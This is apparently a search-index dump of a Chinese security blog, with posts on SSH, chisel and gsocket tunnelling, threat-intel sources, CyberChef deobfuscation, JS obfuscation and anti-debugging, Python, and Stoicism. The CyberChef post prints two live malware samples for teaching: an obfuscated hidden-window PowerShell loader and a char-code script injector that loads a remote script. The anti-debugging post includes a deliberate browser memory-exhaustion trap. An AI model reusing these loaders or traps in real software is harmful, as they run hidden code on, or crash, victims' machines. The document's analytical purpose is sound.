[{"categories":null,"contents":"Chisel 项目地址：https://github.com/jpillora/chisel\nChisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.\ngsocket 项目地址：https://github.com/hackerschoice/gsocket/tree/master\nThe Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.\n通信是通过gsocket分配密钥后，输入输出都传到官方服务器上实现的。\nSSH隧道 本地转发 - L\n本地转发里的本地，我认为最简单的理解就是执行转发命令后，后续实际用于连接的端口位于本地主机。 本地转发的基本命令形式如下：\nssh -L 主机A端口A:主机C:主机C端口C username@主机B\n结合下面的示意图，我们来理解下这个命令。如果我们的电脑是主机A，主机B是服务器的登录节点，主机C是服务器的子节点，其中我们的主机A可以连接主机B，但不能直接访问主机C。这时如果我们想要在自己电脑上直接使用主机C上部署在端口C的服务，就可以使用上面的命令，将端口C转发到本地的端口A上。 这时，我们在本地其它程序访问A端口，就等于访问了主机C的端口C，就好像在A和C端口之间打了一条隧道直连一样。 另外主要注意的时，主机B可以和主机C是同一台电脑，我们只要把上面命令里的主机C改成localhost即可。一般用在我们只能访问B的部分端口的情况。\n远程转发 - R\n远程转发里的远程，同样的理解方法，在执行转发命令后，后续实际用于连接的端口在远程主机。 远程转发的基本命令形式如下：\nssh -R 主机B端口B:主机C:主机C端口C username@主机B\n同样结合示意图来进行理解。此时我们的主机A与主机C位于同一个内网，无法被直接访问，主机B位于公网可以直接访问。如果我们想要访问主机C端口C上的服务，可以在主机A上发起到主机B的ssh连接，执行如上命令。 这是，访问主机B的端口B，就等于访问主机C的端口C。同样的，主机A和主机C可以是同一台电脑，实现将内网机器提供的服务暴露到公网上。\n动态转发 - D\n不同于上面的固定端口转发，动态转发相当于把主机B当做一台代理来使用，使用如下命令，可以在端口A上提供一个socks5代理服务。这样当我们在主机A的其它应用上设置了代理后，就可以通过主机B来访问网络，并且A和B之间的通信会被ssh加密。这也是最雏形的越过wall的方式。\nssh -D 主机A端口A username@主机B\n在执行上面的命令时，会同时打开一个ssh交互终端，如果我们只是需要后台启动隧道，可以添加- N参数。\nDNS隧道 反向SOCKET代理 ","date":"2024-08-07T10:38:40+08:00","permalink":"https://wander1ng.com/post/%E5%B8%B8%E8%A7%81%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/","section":"post","tags":["技术"],"title":"常见隧道工具实现"},{"categories":null,"contents":"安全厂商 赛博菩萨Cloudflare安全博客\n卡巴斯基\n火眼\n麦咖啡\n思科\nCisco Talos\nVT\nCheckpoint\nakama\nahnlab\navast.\ncyble\nglobal.ahnlab.com\ncybersecurity.att.com\nzscaler.com\nbroadcom.com\n科技公司 Intel\n资安媒体 securityweek\nthehackernews\nbleepingcomputer.com\n","date":"2024-07-15T10:11:09+08:00","permalink":"https://wander1ng.com/post/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5rss%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/","section":"post","tags":["技术"],"title":"威胁情报RSS体系构建"},{"categories":null,"contents":"","date":"2024-07-10T10:49:35+08:00","permalink":"https://wander1ng.com/post/%E9%9F%A9%E5%9B%BD%E6%96%B9%E5%90%91apt-q-12%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/","section":"post","tags":["技术"],"title":"韩国方向APT-Q-12\u0026APT-Q-15攻击样本分析复现"},{"categories":null,"contents":"https://mp.weixin.qq.com/s/MKgXLnMX9PTZIAEfoh1Okw\n","date":"2024-07-10T10:16:39+08:00","permalink":"https://wander1ng.com/post/%E5%8D%B0%E5%BA%A6%E6%96%B9%E5%90%91%E7%99%BD%E8%B1%A1apt%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E4%B8%80/","section":"post","tags":["技术"],"title":"印度方向白象\u0026响尾蛇APT攻击样本分析复现(一)"},{"categories":null,"contents":"https://mp.weixin.qq.com/s/q796regUE66tEOc4RnGtdg\n","date":"2024-07-10T10:13:47+08:00","permalink":"https://wander1ng.com/post/%E6%9C%9D%E9%B2%9C%E6%96%B9%E5%90%91kimsukyapt%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E4%B8%80/","section":"post","tags":["技术"],"title":"朝鲜方向Kimsuky组织APT攻击样本分析复现(一)"},{"categories":null,"contents":"https://mp.weixin.qq.com/s/9INu5Y-GP75C9aiZ4kgY0A\n","date":"2024-07-10T10:07:42+08:00","permalink":"https://wander1ng.com/post/%E8%B6%8A%E5%8D%97%E6%96%B9%E5%90%91%E6%B5%B7%E8%8E%B2%E8%8A%B1apt%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E4%B8%80/","section":"post","tags":["技术"],"title":"越南方向海莲花APT攻击样本分析复现(一)"},{"categories":null,"contents":"CyberChef是一款强大的编码转换器，下载地址在Cyberchef\n它简单易懂易上手，集成了多种编码转换的功能，如：base64加解密、hex转换、char转换、正则表达式等，能辅助大家方便快捷地解密出恶意脚本。\n其界面如下图，最左边的Operations是转换工具集，把挑选好的工具经过DIY组合及排序拖拽到Recipe中，就可以对Input中的字符串进行相应地解密操作了，工具很多，可以在Search框中搜索，输出结果会打印在Output窗口中。\n示例：反混淆Powershell代码 @echo off if %PROCESSOR_ARCHITECTURE%==x86 (powershell.exe -NoP -NonI -W Hidden -Command \u0026#34;Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\u0026#34;nVRtc9pGEP7Or9jRXGekMRIyENdG45k4OG7cBocax07LMJ1DWtCF0518OvFiwn/vCquYfO0XnXa1t8+zu8+KPcMlvHca42spb7NcG+s6CzQKZacdJFI63gTycipFDIXllg5cW/oOt8oOrYFHYWzJ5ZWUOnZrn8yvksRgUTShFMpCshqJF6yN2WsspdLqYZO/uYdGW4ytF/1vLn2D3OJDSkfyxuXVvrLWiGlp8YiU5fHildkhmHzGHtgf3ENueIaEdbi8x6ISbiSfH0e+ot0mVIbzvmHNZssS6rBz9aF//fHmt0+3v//xeXD3Zfjn/ejh6+PTt7/+5tM4wdk8Fd8XMlM6fzaFLZer9eYlPG13uu/Ofj2/cIIH3U+5uTKGb1yvMStVXKFD7LKltwWDtqQ+uO6Y2I0nE2DLn2/ADxggL0qD/pfpd2oz+KMy8wJ6wC8Qrk/DEHx8hou2t3vLbmHLZhV7JzoNgs6Pmabi4tTX+xT07eQSWDJ252h9w1WiM/AzvhYZZWVJ8BnV3KbeZBfV/NgsOsqOsIXc6JhaDdsxr4hO2Jrg6HEC7J9dBKgSorAm9gWpocaFratw9Z9xv8f1AkVacL3d7ghgvgViDC4Tl2HEBPjSwlmX3k5OvC1LCclGbFEBJoSAEUBdIF2RIIjvguKKKiCtGMkIxAxc6nnheXDoOkUQbG04F8tvXx0qc3yHNhihWYoYh5rGMuCKz9FMer3Ki6aPxoqZoE3ARy5FspdTn0s5JVkS5pZZU+IuYhkZd1RwPbjRprCYBVX6J5z2pUBlowbLgk8kPDRFQPJ1nbJA4xOesk4TnIF+EVLyVjcIib/OcgKbSqp4MLr9CGfBaQRPgvq4KuDuwXO8iCkCnUcw/rCxuBdUXrUhC671SknNk2tuueuk1uZFr9XqvAvaYTc4bwdnF71ut9Mqc6oHW0w54DWYprvEyq/2nRSC2RTNNc6EEvs5sWfw72i/wCESnbYDviKryHmMsPfc1BMtwM95UdjUlA22vmS61/vp/xM2WV6rrhmuO2EY0tENvWhcN+2+VFZkGNC6otF5PZ4iGHBTpFzSbPo637gsb0LYhPHrVk9ctqZtIqPTdj2vCQeQqjS6cvzbIcQmWzerI6y2TpfWV6Uk6ex/Lf5IIua0fBhr0vb5WTcMdySBON3u/gU=\\\u0026#34;)))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\u0026#34;) else (%WinDir%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \u0026#34;Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\u0026#34;nVRtc9pGEP7Or9jRXGekMRIyENdG45k4OG7cBocax07LMJ1DWtCF0518OvFiwn/vCquYfO0XnXa1t8+zu8+KPcMlvHca42spb7NcG+s6CzQKZacdJFI63gTycipFDIXllg5cW/oOt8oOrYFHYWzJ5ZWUOnZrn8yvksRgUTShFMpCshqJF6yN2WsspdLqYZO/uYdGW4ytF/1vLn2D3OJDSkfyxuXVvrLWiGlp8YiU5fHildkhmHzGHtgf3ENueIaEdbi8x6ISbiSfH0e+ot0mVIbzvmHNZssS6rBz9aF//fHmt0+3v//xeXD3Zfjn/ejh6+PTt7/+5tM4wdk8Fd8XMlM6fzaFLZer9eYlPG13uu/Ofj2/cIIH3U+5uTKGb1yvMStVXKFD7LKltwWDtqQ+uO6Y2I0nE2DLn2/ADxggL0qD/pfpd2oz+KMy8wJ6wC8Qrk/DEHx8hou2t3vLbmHLZhV7JzoNgs6Pmabi4tTX+xT07eQSWDJ252h9w1WiM/AzvhYZZWVJ8BnV3KbeZBfV/NgsOsqOsIXc6JhaDdsxr4hO2Jrg6HEC7J9dBKgSorAm9gWpocaFratw9Z9xv8f1AkVacL3d7ghgvgViDC4Tl2HEBPjSwlmX3k5OvC1LCclGbFEBJoSAEUBdIF2RIIjvguKKKiCtGMkIxAxc6nnheXDoOkUQbG04F8tvXx0qc3yHNhihWYoYh5rGMuCKz9FMer3Ki6aPxoqZoE3ARy5FspdTn0s5JVkS5pZZU+IuYhkZd1RwPbjRprCYBVX6J5z2pUBlowbLgk8kPDRFQPJ1nbJA4xOesk4TnIF+EVLyVjcIib/OcgKbSqp4MLr9CGfBaQRPgvq4KuDuwXO8iCkCnUcw/rCxuBdUXrUhC671SknNk2tuueuk1uZFr9XqvAvaYTc4bwdnF71ut9Mqc6oHW0w54DWYprvEyq/2nRSC2RTNNc6EEvs5sWfw72i/wCESnbYDviKryHmMsPfc1BMtwM95UdjUlA22vmS61/vp/xM2WV6rrhmuO2EY0tENvWhcN+2+VFZkGNC6otF5PZ4iGHBTpFzSbPo637gsb0LYhPHrVk9ctqZtIqPTdj2vCQeQqjS6cvzbIcQmWzerI6y2TpfWV6Uk6ex/Lf5IIua0fBhr0vb5WTcMdySBON3u/gU=\\\u0026#34;)))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\u0026#34;) 这段代码经过了简单的base64混淆，首先要做的是使用正则表达式筛选出base64正文部分：\n在左侧的Operations栏将Regular expreession拖入Recipe中，填入匹配base64正文的正则表达式[0-9a-zA-Z/+=]{30,}，筛选出30个以上连续的base64编码字符。\n将Output format选择为List matches即可在Output中只显示符合条件的字符。\n再从左侧的Operation中把Frombase64拖进来，即可直接在Output中呈现解码后的字符。\n注意到原Poweershell代码中还使用了DeflateStream函数，将Raw Inflate拖进Recipe即可解密。再使用Generic Code Beautify提高代码可读性，perfect！\n对于这一类混淆，都可以用这一套流程来解密，点击Save recipe将其保存，后面遇到相似的混淆都可以用它解决。\n示例：反混淆char类型恶意脚本 eval(String.fromCharCode(118, 97, 114, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 49, 48, 49, 44, 32, 49, 50, 48, 44, 32, 57, 55, 44, 32, 49, 48, 57, 44, 32, 49, 48, 52, 44, 32, 49, 49, 49, 44, 32, 49, 48, 57, 44, 32, 49, 48, 49, 44, 32, 52, 54, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 54, 44, 32, 52, 55, 44, 32, 49, 49, 53, 44, 32, 49, 49, 54, 44, 32, 57, 55, 44, 32, 49, 49, 54, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 44, 32, 54, 51, 44, 32, 49, 49, 56, 44, 32, 54, 49, 44, 32, 52, 57, 44, 32, 52, 54, 44, 32, 52, 56, 44, 32, 52, 54, 44, 32, 52, 57, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 49, 44, 32, 49, 50, 48, 44, 32, 57, 55, 44, 32, 49, 48, 57, 44, 32, 49, 48, 52, 44, 32, 49, 49, 49, 44, 32, 49, 48, 57, 44, 32, 49, 48, 49, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125)); 首先使用正则表达式([0-9]{2,3}(,s|))+筛选char型，然后使用From Charcode对字符串进行转换，在转换前需要将间隔符Delimiter选为Comma（逗号），Base选为10进制，就可以解密出恶意代码了。\n泪目了，早用上这个东西也不至于一个个对着ASCII码表替换了，和上古时代的电报员一样。\n循环解密 在Operation中的Flow control中将Label拖到最前面，Jump拖到最后面，Jump的地址为Label的name，Maxmium jumps为要循环的次数，即可进行循环解密。\n总结 CyberChef 可以简单理解成一个脚本解密工具的集合，除此之外，它其实还有很多黑科技，比如解析网络数据包里的数据、解析图片的地理位置及时间信息等。\n","date":"2024-07-10T10:05:48+08:00","permalink":"https://wander1ng.com/post/%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%A5%9E%E5%99%A8cyberchef%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","section":"post","tags":["技术"],"title":"数据处理神器Cyberchef使用指南"},{"categories":null,"contents":"什么是斯多葛主义 斯多葛学派是希腊哲学的一个流派，由基提乌姆的芝诺（Zeno）创立，成立于公元前4世纪并持续了大约5个世纪。今天最著名的古代斯多葛学派人物生活在罗马帝国时期：小塞内加（Seneca the Younger）、爱比克泰德（Epictetus）和罗马皇帝马可·奥勒留（Marcus Aurelius）。大多数人是从马可·奥勒留的《沉思录》（The Meditations）开始了解该哲学的，我建议你们读完这篇文章后再读这本书。\n斯多葛主义从根本上说是一种哲学世界观，它有着一套特定的伦理价值体系。这些价值观是一系列心理学实践的基础，旨在帮助我们成为更好的自己。在实践的过程中，我们变得更富有心理韧性，更不容易被生活中的事件所困扰。\n斯多葛学派认为，一种行为或道德上的智慧是唯一真实且至高无上的追求，他们称这种智慧为“美德”（Virtue）。换句话说，我们自身的品质比一切外物来得重要。我们无法完全控制发生在我们身上的遭遇，但却能控制自己如何去应对那些情况。生活是由你自己创造的。\n人生的目标不应是享乐或名利，因为那些多半都在天不在我。人生的目标应是借着智慧和品质的力量来处理好命运交给我们的任何东西，无论那是痛苦还是快乐，名誉还是谴责，财富还是贫穷。\n然而，这并不意味着斯多葛学派对美德外的一切都漠不关心（这是很多人对这派哲学的最大误解，所以这此我们需要额外注意）。斯多葛主义者确实有一些偏好，他们更想要快乐而非痛苦，更想要朋友而非敌人，更想要财富而非贫穷。然而，如果运气不佳，事与愿违，他们也不会感到强烈的沮丧。\n斯多葛派学说以伦理学为重心，秉持泛神物质一元论，强调神、自然与人为一体，“神”是宇宙灵魂和智慧，其理性渗透整个宇宙。\n在这种意义上，斯多葛学派是在学会接受他们的遭遇。他们从不抱怨，只是尽力处理好事务继续他们的生活。我认为斯多葛派伦理学的精髓是在两种显然矛盾的心理状态之间取得平衡。\n《埃皮克提图指南》（Enchiridion of Epictetus）是一本描述斯多葛主义训练的古老手册。我说过我不打算在这里讨论一次文献，但我不得不提到这本书开头句所包含的基本概念：“有些事我们可以控制，而另一些却不行。”**现代的斯多葛学派倾向于称它为“控制二分法”（Dichotomy of Control）。**很明显，生活中有些事情是由我们决定的，而另一些则不是。但斯多葛主义者确实在这句话之中传达着更为深远的涵义。\n人们往往会忽视这一区别，担心或挣扎于他们无法控制的事情。一个很好的例子就是你不能改变过去——太晚了，该发生的都已经发生了。尽管我们在一定程度上都会后悔，但对过去的病态回顾在抑郁症患者中更为常见。我喜欢用莎士比亚的《麦克白夫人》（Lady Macbeth）的台词告诫自己：“无法补救的就无需后悔。”顺便说一句，你们如果听过匿名戒酒会著名的“静心祷告”（Serenity Prayer），就会发现它实际上表达了同样的意思：\n上帝，赐予我去接受我不能改变之事的宁静\n去改变我可以改变之事的勇气和去知晓二者区别的智慧\n第二个基本概念与第一个基本概念非常接近，它恰好可以用《埃皮克提图指南》中最广为引用的一句话来完美地概括：“让我们沮丧的不是事件，而是我们对事件的看法。”顺便说一句，每位认知行为治疗师都知道这句话，因为几十年来，这是治疗之初他们最常对患者说的一句话。我们说过，有些事情是由我们决定的，另一些则不是。\n真正由我们决定的只有我们自己的思想和行为，包括我们选择看待生活中所面临的情况的方式。斯多葛派还有一句名言：凡事皆有好坏。当人们试图用坏的一面思考事件时，他们会感到不安和沮丧。例如，假设你在工作中做一个重要的演示时，有人问了你一个你无法回答的问题。当你告诉自己：“这简直是一场灾难，我看起来像个十足的白痴——我无法应对这种尴尬”，你的目光仅仅局限在了坏的一面上。你完全可以告诉自己“这没什么大不了的，最重要的是我做我最好的，我可以先停下来，承认我现在没有答案，并承诺得到答案后会回复他们”，这就是以好的一面在思考问题。\n我们的思想至少在某种程度上塑造着我们的情感。更具体地来说，斯多葛学派认为我们对事物重要性的优先级和我们的价值观是塑造情感的关键。这就把我们带回到了我在开头提到的斯多葛主义伦理学的基本原则。如果一个人相信外部事物和他人意见是最重要的，那他/她就离得神经症不远了——如果事情的结果不符合期盼，人就会陷于周而复始的沮丧和烦躁之中。\n斯多葛派希望我们对生活抱有更现实的态度，谨记事物的无常性，不幸与幸运会交替着发生。当人们在深层次上接受命运，并由此对事物愈加超脱和抽离，他们即可抵达智慧的境地。\n关键是要注意到我们的价值并不取决于外界，那些只是虚假的投射。我们的财富会起起落落，就像一块石头被扔到空中又落下来，但它的起落对石头来说没有任何影响。只有我们的内心产生了比较级，这个事物才对我们显得重要。只有当我们将其化作严格的要求，我们才会陷入不安：我不能跌倒，我必须成功！但也许这并没有那么重要，也许这不值得烦恼。斯多葛派认为任何外部事件都不值得烦恼，真正重要唯有我们自己的品质以及我们选择如何处理生活中发生的事情。\n三个日常训练 从某种意义上说，以一种特殊的方式看待世界本身就是一种重要的心理学实践。\n客观描述\n正如刚才所说，斯多葛学派认为我们的价值观就好比阳光照亮物体那样，是投射而并非实体。我们戴着玫瑰色的眼镜看世界，收获的视野会跟戴着阴郁的暗蓝色眼镜来得不同。斯多葛学派人士用来自我提醒的方法是用非常客观的语言来描述事件，避免任何强烈的价值判断或情绪化的修辞。\n理解美德\n斯多葛主义的训练在某种程度上就是澄清我们自身的核心价值观。斯多葛派确实相信这些价值观应该是理性的——这是一种基于理性的哲学，而不是一种基于信仰、传统或启示的宗教。\n不过，斯多葛学派哲学之所以能在理性上迈出一大步，要归功于他们从苏格拉底那里继承来的一种简单工具。在它的帮助下，斯多葛学派得以阐明他们的价值观，并使其逻辑上更为严谨统一。\n我们可以将其描述为一种“双重标准”的策略。找一张纸，在中间画一条线，分成两列。在一栏的顶部写上“期望”，在另一栏的顶部写上“钦佩”。现在，在第一个标题下，写下一些你生活中最不开心的事情，或者你发现自己花时间去追求的事情。\n这些可以是你投入了精力想要避免、改变或实现的事情。例如，人们倾向于写“寻找伴侣”，“在工作中给人留下深刻印象”，或者“看新闻”等等。他们当下表现得好像这些事情很重要。\n现在想想别人身上你最钦佩的品质，他们是谁并不重要，可以是朋友或同事，也可以是你崇拜的历史人物或虚构人物。你觉得他们的哪些性格特征最值得称赞？阐明你自身价值观的一个简单方法，就是想想别人身上你最钦佩的品质。\n最后，如果你将一些或全部的“美德”移到第一列中，会发生什么？换句话说，如果你投入更多的时间和精力来培养你所钦佩人物的品质，生活将会有什么改变？你的今天、明天和后天会变得怎么样？如果这成为一个长期的习惯或者你的整个生活方式呢？例如，一个名叫克里托布鲁斯（Critobulus）的年轻人曾请求苏格拉底帮助他结交新朋友。苏格拉底让他列出他在理想朋友身上寻找的品质，并帮他反思和阐明这些品质。然后，他秉承一贯作风把整个讨论抛回到这个年轻人身上，问他自己有多少这样的品质。答案基本上是：一个都没有。\n他们得出的结论是，这个年轻人之前的问题是本末倒置的，**他应该先投入时间和精力把自己变成他想结识的对象那样的人。**他们的讨论恰好印证了苏格拉底的一个哲学母题：你应该在现实中成为你理想中想成为的样子。\n高处视野\n记住，斯多葛主义是一种哲学，而不是一种宗教。斯多葛学派希望运用理性牢牢地把握生活的真谛。他们自然而然指出来，为了做到这一点我们必须从一个更大的角度来考虑事情。多数时间，生活中的我们狭隘地看待事件，其性质等同于断章取义，由于关键信息的遗漏而存在误导性。因此，斯多葛派试图拓宽他们看事件的角度。他们明白，我们在生气或难过时倾向于缩小注意力范围，放大最糟糕的部分。\n","date":"2024-07-09T14:24:39+08:00","permalink":"https://wander1ng.com/post/stoic%E5%AD%A6%E6%B4%BE%E4%B8%8E%E8%AF%BE%E9%A2%98%E5%88%86%E7%A6%BB%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E6%B4%BD%E7%9A%84%E4%BA%BA/","section":"post","tags":["阅读"],"title":"《Stoic学派与课题分离》——成为一个自洽的人"},{"categories":null,"contents":"在 Python 中，使用按位与运算符 \u0026amp; 来连接多个条件在 if 语句中不是常见做法。如果你实际上是想判断多个布尔表达式的逻辑与，即 a、b、c 都为真时执行某个代码块，那么你应该使用逻辑与 and 运算符。\n使用逻辑与 and 运算符 当使用 and 时，Python 会从左到右依次计算每个条件。如果其中任何一个条件为 False，则整个表达式为 False，并且后续的条件将不会被计算，程序直接跳到 else 代码块。这种行为被称为 “短路” (short-circuit) 评估。\na = True\rb = False\rc = True\rif a and b and c:\rprint(\u0026#34;All conditions are True\u0026#34;)\relse:\rprint(\u0026#34;One or more conditions are False\u0026#34;) 在这种情况下，由于 b 是 False，所以 c 不会被计算，程序直接进入 else 代码块，输出：\nOne or more conditions are False 使用按位与 \u0026amp; 运算符 按位与运算符 \u0026amp; 对左右两边的操作数逐位执行按位与运算，不进行布尔运算。用于条件判断时，它会对所有操作数进行计算，而不会 “短路”。\na = True\rb = False\rc = True\rif a \u0026amp; b \u0026amp; c:\rprint(\u0026#34;All conditions are True\u0026#34;)\relse:\rprint(\u0026#34;One or more conditions are False\u0026#34;) 在这种情况下，虽然 b 是 False，但 a、b、c 都会被计算。因为 b 为 False，所以结果仍然是 False， 程序会进入 else 代码块，输出：\nOne or more conditions are False 小结 逻辑与 and: 如果任何一个条件为 False，则不会计算后续条件，直接跳到 else（短路评估）。 按位与 \u0026amp;: 对所有条件进行位运算，不会短路。如果要判断多个布尔条件应使用 and。 总的来说，在逻辑判断中使用 and 是更为合理和常见的做法，因为它能够利用短路评估来提高代码的效率。\nif a and b and c:\r# 执行所有条件都为真的情况\r... 这会在找到第一个 False 时立即停止后续的判断，从而提高代码效率。\n","date":"2024-07-09T14:22:49+08:00","permalink":"https://wander1ng.com/post/python%E4%B8%AD%E7%9A%84%E7%9F%AD%E8%B7%AF%E8%AF%84%E4%BC%B0/","section":"post","tags":["技术"],"title":"Python中的短路评估"},{"categories":null,"contents":"JavaScript 混淆（Obfuscation）是指通过一系列技术手段，使 JS 代码变得难以理解和分析，增加代码的复杂性和混淆度，阻碍逆向工程和代码盗用。实际上就是一种保护 JS 代码的手段。JS最早被设计出来就是为了在客户端运行，直接以源码的形式传递给客户端，如果不做处理则完全公开透明，任何人都可以读、分析、复制、盗用，甚至篡改源码与数据，这是网站开发者不愿意看到的。\n压缩工具开发的初衷是减小 JS 文件体积，但 JS 代码经过压缩替换后，其可读性也大大降低，间接起到了保护代码的作用。但是后来主流浏览器的开发者工具都提供了格式化代码的功能，压缩技术所能提供的安全保护收效甚微。于是专门保护 JS 代码的技术：JS 加密和 JS 混淆。\n常见混淆手段 变量名/函数名的替换，将有意义的变量名函数名替换为随机生成的名称\n/*\rfunction calculateArea(radius) {\rreturn Math.PI * radius * radius;\r}\rconsole.log(calculateArea(5));\r*/\rfunction _0x2d8f05(_0x4b083b) {\rreturn Math.PI * _0x4b083b * _0x4b083b;\r}\rconsole.log(_0x2d8f05(5)); 字符串混淆，将代码中的字符串替换为编码或加密的形式，可以防止字符串被轻易读取。\n// console.log(\u0026#34;Hello, world!\u0026#34;);\rconsole.log(\u0026#34;\\x48\\x65\\x6c\\x6c\\x6f\\x2c\\x20\\x77\\x6f\\x72\\x6c\\x64\\x21\u0026#34;); 控制流混淆，改变代码的执行顺序或结构。例如，可以使用条件语句和循环语句来替换简单的赋值操作。\n/*\rlet a = 1;\rlet b = 2;\rlet c = a + b;\rconsole.log(c);\r*/\rlet a = 1;\rlet b = 2;\rlet c;\rif (a === 1) {\rif (b === 2) {\rc = a + b;\r}\r}\rconsole.log(c); 花指令，即在源码插入一些不会被执行的代码。\n/*\rlet a = 1;\rlet b = 2;\rlet c = a + b;\rconsole.log(c);\r*/\rlet a = 1;\rlet b = 2;\rif (false) {\rconsole.log(a - b);\r}\rlet c = a + b;\rconsole.log(c); 代码转换，将代码转换为等价的，但更难理解的形式。\n/*\rlet a = 1;\rlet b = 2;\rlet c = a + b;\rconsole.log(c);\r*/\rlet a = 1;\rlet b = 2;\rlet c = a - (-b);\rconsole.log(c); 常见反调试手段 实现防止他人调试、动态分析自己的代码，我们可以预先在代码中做处理，防止用户调试代码。\n无限 debugger。比如写个定时器死循环禁止调试。\nvar c = new RegExp(\u0026#34;1\u0026#34;);\rc.toString = function () {\ralert(\u0026#34;检测到调试\u0026#34;)\rsetInterval(function() {\rdebugger\r}, 1000);\r}\rconsole.log(c); 内存耗尽。更隐蔽的反调试手段，代码运行造成的内存占用会越来越大，很快会使浏览器崩溃。\nvar startTime = new Date();\rdebugger;\rvar endTime = new Date();\rvar isDev = endTime - startTime \u0026gt; 100;\rvar stack = [];\rif (isDev) {\rwhile (true) {\rstack.push(this);\rconsole.log(stack.length, this);\r}\r} 检测函数、对象属性修改。攻击者在调试的时，经常会把防护的函数删除，或者把检测数据对象进行篡改。可以检测函数内容，在原型上设置禁止修改。\nfunction eval() {\r[native code]\r}\rwindow.eval = function(str) {\rconsole.log(\u0026#34;[native code]\u0026#34;);\r};\rwindow.eval = function(str) {\r};\rwindow.eval.toString = function() {\rreturn `function eval() {[native code]}`\r};\rfunction hijacked(fun) {\rreturn \u0026#34;prototype\u0026#34; in fun || fun.toString().replace(/\\n|\\s/g, \u0026#34;\u0026#34;) != \u0026#34;function\u0026#34; + fun.name + \u0026#34;() {[nativecode]}\u0026#34;;\r} 在线混淆工具 反混淆 JS 反混淆（Deobfuscator ）是指对经过混淆处理的代码进行还原和解析，以恢复其可读性。Deobfuscator 可以通过对代码进行静态分析和动态分析等方式来实现。需要注意的是，Obfuscation 只能降低可读性，不能完全避免逆向攻击，而 Deobfuscator 也并不能完全还原混淆过的代码。\n在线反混淆工具 